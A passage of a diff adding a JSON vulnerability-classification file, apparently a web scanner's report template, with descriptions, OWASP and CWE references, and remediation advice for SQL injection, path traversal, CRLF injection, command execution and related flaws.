+      "desc": "It may be possible to find backup files of scripts on the webserver that the web-admin put here to save a previous version or backup files that are automaticallygenerated by the software editor used (like for example Emacs). These copies may reveal interesting informations like source code or credentials"
+    }, 
+    "SQL Injection": {
+      "ref": {
+        "http://www.owasp.org/index.php/SQL_Injection": "http://www.owasp.org/index.php/SQL_Injection", 
+        "http://en.wikipedia.org/wiki/SQL_injection": "http://en.wikipedia.org/wiki/SQL_injection", 
+        "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')": "http://cwe.mitre.org/data/definitions/89.html"
+      }, 
+      "sol": "To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.", 
+      "desc": "SQL injection vulnerabilities allow an attacker to alter the queries executed on the backend database. An attacker may then be able to extract or modify informations stored in the database or even escalate his privileges on the system."
+    }, 
+    "Blind SQL Injection": {
+      "ref": {
+        "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')": "http://cwe.mitre.org/data/definitions/89.html", 
+        "http://www.imperva.com/resources/adc/blind_sql_server_injection.html": "http://www.imperva.com/resources/adc/blind_sql_server_injection.html", 
+        "http://www.owasp.org/index.php/Blind_SQL_Injection": "http://www.owasp.org/index.php/Blind_SQL_Injection"
+      }, 
+      "sol": "To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.", 
+      "desc": "Blind SQL injection is a technique that exploits a vulnerability occurring in the database of an application. This kind of vulnerability is harder to detect than basic SQL injections because no error message will be displayed on the webpage."
+    }, 
+    "File Handling": {
+      "ref": {
+        "http://www.owasp.org/index.php/Path_Traversal": "http://www.owasp.org/index.php/Path_Traversal", 
+        "http://www.acunetix.com/websitesecurity/directory-traversal.htm": "http://www.acunetix.com/websitesecurity/directory-traversal.htm", 
+        "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')": "http://cwe.mitre.org/data/definitions/22.html"
+      }, 
+      "sol": "Prefer working without user input when using file system calls. Use indexes rather than actual portions of file names when templating or using language files (eg: value 5 from the user submission = Czechoslovakian, rather than expecting the user to return 'Czechoslovakian'). Ensure the user cannot supply all parts of the path - surround it with your path code. Validate the user's input by only accepting known good - do not sanitize the data. Use chrooted jails and code access policies to restrict where the files can be obtained or saved to.", 
+      "desc": "This attack is also known as Path or Directory Traversal, its aim is the access to files and directories that are stored outside the web root folder. The attacker tries to explore the directories stored in the web server. The attacker uses some techniques, for instance, the manipulation of variables that reference files with 'dot-dot-slash (../)' sequences and its variations to move up to root directory to navigate through the file system."
+    }, 
+    "Potentially dangerous file": {
+      "ref": {
+        "The Open Source Vulnerability Database": "http://osvdb.org/"
+      }, 
+      "sol": "Make sure the script is up-to-date and restrict access to it if possible", 
+      "desc": "A file with potential vulnerabilities has been found on the website."
+    }, 
+    "CRLF Injection": {
+      "ref": {
+        "CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')": "http://cwe.mitre.org/data/definitions/93.html", 
+        "http://www.owasp.org/index.php/CRLF_Injection": "http://www.owasp.org/index.php/CRLF_Injection", 
+        "http://www.acunetix.com/websitesecurity/crlf-injection.htm": "http://www.acunetix.com/websitesecurity/crlf-injection.htm", 
+        "VulneraNET wiki: CRLF Injection article": "http://lab.gsi.dit.upm.es/semanticwiki/index.php/CRLF_Injection"
+      }, 
+      "sol": "Check the submitted parameters and do not allow CRLF to be injected by filtering CRLF", 
+      "desc": "The term CRLF refers to Carriage Return (ASCII 13, \\r) Line Feed (ASCII 10, \\n). They're used to note the termination of a line, however, dealt with differently in today's popular Operating Systems. For example: in Windows both a CR and LF are required to note the end of a line, whereas in Linux/UNIX a LF is only required. This combination of CR and LR is used for example when pressing 'Enter' on the keyboard. Depending on the application being used, pressing 'Enter' generally instructs the application to start a new line, or to send a command."
+    }, 
+    "Commands execution": {
+      "ref": {
+        "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')": "http://cwe.mitre.org/data/definitions/78.html", 
+        "http://www.owasp.org/index.php/Command_Injection": "http://www.owasp.org/index.php/Command_Injection"
+      }, 
+      "sol": "Prefer working without user input when using file system calls", 
+      "desc": "This attack consists in executing system commands on the server. The attacker tries to inject this commands in the request parameters"
+    }
+  }, 
+  "anomalies": {
+    "Resource consumption": [], 
+    "Internal Server Error": []
+  }
+}
